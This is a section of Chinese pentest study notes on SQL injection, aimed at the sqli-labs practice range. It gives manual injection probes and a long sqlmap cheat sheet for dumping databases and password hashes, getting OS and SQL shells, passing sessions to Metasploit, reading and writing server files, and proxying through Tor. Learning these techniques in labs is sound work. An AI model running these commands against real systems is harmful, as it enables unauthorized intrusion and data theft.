
### 3.2.6 SQL 注入

#### 学习型靶场

SQLi-labs按照 https://github.com/Audi-1/sqli-labs 的提示安装和练习

#### 注入判断

在地址的最后加一个单引号，如果有关于语法的报错，即为存在SQL注入

```
http://ctf4.sas.upenn.edu/index.html?page=blog&title=Blog&id=2%27

测试输入表单参数（比如 1' or 1=1 limit 1; # AND 1' or 1=1--）

	NULL 或 null

	', ", ;, <!

		中断 SQL 字符串或查询，常用于 SQLXPathXML 注入

用于手工 SQL 注入测试
	', &, ! , ¦ , < , >
```

确定是否存在注入

在地址的最后加一个单引号，如果有报错，即为存在SQL注入

```
http://ctf4.sas.upenn.edu/index.html?page=blog&title=Blog&id=2'
```

#### 手工注入

```
' or 1=1 -- 
```

https://blog.csdn.net/qq_45747465/article/details/132283743

https://blog.csdn.net/peanut5036/article/details/128553795

https://www.php.cn/faq/544967.html

https://www.pianshen.com/article/3596668244/



#### 数据库类型识别



#### MSSQL



#### MYSQL



#### Oracle



#### PostgreSQL



#### SQLite



#### DB2
## ScanQLi SQL注入检测工具

> ScanQLi 是一个简单的 SQL 注入扫描程序，具有一些附加功能。该工具无法利用 SQLi，只能检测到它们。

项目地址：github.com/bambish/Scan

## Sqlmap 自动化SQL注入

Sqlmap自动化注入

http://pentestmonkey.net/category/cheat-sheet

sqlmap中文文档
https://blog.csdn.net/qq_56313338/article/details/132652330

社区汉化版
- https://github.com/BugFor-Pings/CN_Sqlmap

安装

```
mkdir sqlmap_cn_1.9
cd sqlmap_cn_1.9
wget https://github.com/BugFor-Pings/CN_Sqlmap/releases/download/v1.9/CN_sqlmap-1.9.zip
unzip 
```

常用预设

```
sqlmap -u "http://127.0.0.1/sqli-labs/Less-1/?id=1"   #探测该url是否存在漏洞

sqlmap -u "http://127.0.0.1/sqli-labs/Less-1/?id=1" --users -passwords --batch
```

常用参数：
```
-v3                   #输出详细度  最大值5 会显示请求包和回复包
--threads 5           #指定线程数
--fresh-queries       #清除缓存
--flush-session       #清空会话，重构注入 
--batch               #对所有的交互式的都是默认的
--random-agent        #任意的http头
--tamper base64encode            #对提交的数据进行base64编码
--referer http://www.baidu.com   #伪造referer字段
--keep-alive     保持连接，当出现 [CRITICAL] connection dropped or unknown HTTP status code received. sqlmap is going to retry the request(s) 保错的时候，使用这个参数

```

探测

```
sqlmap -u "http://www.xx.com/username/admin*"       #如果我们已经知道admin这里是注入点的话，可以在其后面加个*来让sqlmap对其注入
sqlmap -u "http://127.0.0.1/sqli-labs/Less-1/?id=1"   #探测该url是否存在漏洞
sqlmap -u "http://127.0.0.1/sqli-labs/Less-1/?id=1"   --cookie="抓取的cookie"   #当该网站需要登录时，探测该url是否存在漏洞
sqlmap -u "http://127.0.0.1/sqli-labs/Less-1/?id=1"  --data="uname=admin&passwd=admin&submit=Submit"  #抓取其post提交的数据填入
```



获取用户名和密码

```
sqlmap -u "http://127.0.0.1/sqli-labs/Less-1/?id=1" --users      #查看数据库的所有用户
sqlmap -u "http://127.0.0.1/sqli-labs/Less-1/?id=1" --passwords  #查看数据库用户名的密码
	有时候使用 --passwords 不能获取到密码，则可以试下
	-D mysql -T user -C host,user,password --dump  当MySQL< 5.7时
	-D mysql -T user -C host,user,authentication_string --dump  当MySQL>= 5.7时

sqlmap -u "http://127.0.0.1/sqli-labs/Less-1/?id=1" --current-user  #查看数据库当前的用户
sqlmap -u "http://127.0.0.1/sqli-labs/Less-1/?id=1" --is-dba    #判断当前用户是否有管理员权限
sqlmap -u "http://127.0.0.1/sqli-labs/Less-1/?id=1" --roles     #列出数据库所有管理员角色，仅适用于oracle数据库的时候
```

常用指令：    

```
sqlmap -r http.txt  #http.txt是我们抓取的http的请求包
sqlmap -r http.txt -p username  #指定参数，当有多个参数而你又知道username参数存在SQL漏洞，你就可以使用-p指定参数进行探测

 
sqlmap -u "http://127.0.0.1/sqli-labs/Less-1/?id=1"    --dbs        #爆出所有的数据库
sqlmap -u "http://127.0.0.1/sqli-labs/Less-1/?id=1"    --tables     #爆出所有的数据表
sqlmap -u "http://127.0.0.1/sqli-labs/Less-1/?id=1"    --columns    #爆出数据库中所有的列
sqlmap -u "http://127.0.0.1/sqli-labs/Less-1/?id=1"    --current-db #查看当前的数据库
sqlmap -u "http://127.0.0.1/sqli-labs/Less-1/?id=1" -D security --tables #爆出数据库security中的所有的表
sqlmap -u "http://127.0.0.1/sqli-labs/Less-1/?id=1" -D security -T users --columns #爆出security数据库中users表中的所有的列
sqlmap -u "http://127.0.0.1/sqli-labs/Less-1/?id=1" -D security -T users -C username --dump  #爆出数据库security中的users表中的username列中的所有数据
sqlmap -u "http://127.0.0.1/sqli-labs/Less-1/?id=1" -D security -T users -C username --dump --start 1 --stop 100  #爆出数据库security中的users表中的username列中的前100条数据
 
sqlmap -u "http://127.0.0.1/sqli-labs/Less-1/?id=1" -D security -T users --dump-all #爆出数据库security中的users表中的所有数据
sqlmap -u "http://127.0.0.1/sqli-labs/Less-1/?id=1" -D security --dump-all   #爆出数据库security中的所有数据
sqlmap -u "http://127.0.0.1/sqli-labs/Less-1/?id=1" --dump-all  #爆出该数据库中的所有数据
 
sqlmap -u "http://127.0.0.1/sqli-labs/Less-1/?id=1"  --tamper=space2comment.py  #指定脚本进行过滤，用/**/代替空格
sqlmap -u "http://127.0.0.1/sqli-labs/Less-4/?id=1" --level=5 --risk=3 #探测等级5，平台危险等级3，都是最高级别。当level=2时，会测试cookie注入。当level=3时，会测试user-agent/referer注入。
sqlmap -u "http://127.0.0.1/sqli-labs/Less-1/?id=1" --sql-shell  #执行指定的sql语句
sqlmap -u "http://127.0.0.1/sqli-labs/Less-4/?id=1" --os-shell/--os-cmd   #执行--os-shell命令，获取目标服务器权限
sqlmap -u "http://127.0.0.1/sqli-labs/Less-4/?id=1" --os-pwn   #执行--os-pwn命令，将目标权限弹到MSF上
 
sqlmap -u "http://127.0.0.1/sqli-labs/Less-4/?id=1" --file-read "c:/test.txt" #读取目标服务器C盘下的test.txt文件
sqlmap -u "http://127.0.0.1/sqli-labs/Less-4/?id=1" --file-write  test.txt  --file-dest "e:/hack.txt"  #将本地的test.txt文件上传到目标服务器的E盘下，并且名字为hack.txt
 
sqlmap -u "http://127.0.0.1/sqli-labs/Less-4/?id=1" --dbms="MySQL"     #指定其数据库为mysql 
其他数据库：Altibase,Apache Derby, CrateDB, Cubrid, Firebird, FrontBase, H2, HSQLDB, IBM DB2, Informix, InterSystems Cache, Mckoi, Microsoft Access, Microsoft SQL Server, MimerSQL, MonetDB, MySQL, Oracle, PostgreSQL, Presto, SAP MaxDB, sqli-labste, Sybase, Vertica, eXtremeDB
sqlmap -u "http://127.0.0.1/sqli-labs/Less-4/?id=1" --random-agent   #使用任意的User-Agent爆破
sqlmap -u "http://127.0.0.1/sqli-labs/Less-4/?id=1" --proxy="http://127.0.0.1:8080"    #指定代理
当爆破HTTPS网站会出现超时的话，可以使用参数 --delay=3 --force-ssl
sqlmap -u "http://127.0.0.1/sqli-labs/Less-4/?id=1" --technique T    #指定时间延迟注入，这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有的方式，当然，我们也可以直接手工指定。
支持的探测方式如下：
　　B: Boolean-based blind SQL injection（布尔型注入）
　　E: Error-based SQL injection（报错型注入）
　　U: UNION query SQL injection（可联合查询注入）
　　S: Stacked queries SQL injection（可多语句查询注入）
　　T: Time-based blind SQL injection（基于时间延迟注入）
  
sqlmap -d "mysql://root:root@127.0.0.130:3306/mysql" --os-shell   #知道网站的账号密码直接连接

```

```
# 枚举数据库
sqlmap --dbms=mysql -u "$URL" --dbs

# 枚举数据表
sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" --tables

# 转储表数据
sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" -T "$TABLE" --dump

# 指定要利用的参数
sqlmap --dbms=mysql -u "http://www.example.com/param1=value1&param2=value2" --dbs -p param2

# 指定要在“nice”URI中利用的参数
sqlmap --dbms=mysql -u "http://www.example.com/param1/value1*/param2/value2" --dbs # 利用参数1

# 获取系统shell
sqlmap --dbms=mysql -u "$URL" --os-shell

# 获取SQL shell
sqlmap --dbms=mysql -u "$URL" --sql-shell

# SQL查询
sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" --sql-query "SELECT * FROM $TABLE;"

# 使用Tor Socks5代理
sqlmap --tor --tor-type=SOCKS5 --check-tor --dbms=mysql -u "$URL" --dbs


```
​    

**参考资料**

> http://t.csdnimg.cn/lnVVf

> http://t.csdnimg.cn/964ir



#### 参考资料

https://blog.csdn.net/qq_45747465/article/details/132283743

https://blog.csdn.net/peanut5036/article/details/128553795

https://www.php.cn/faq/544967.html

https://www.pianshen.com/article/3596668244/


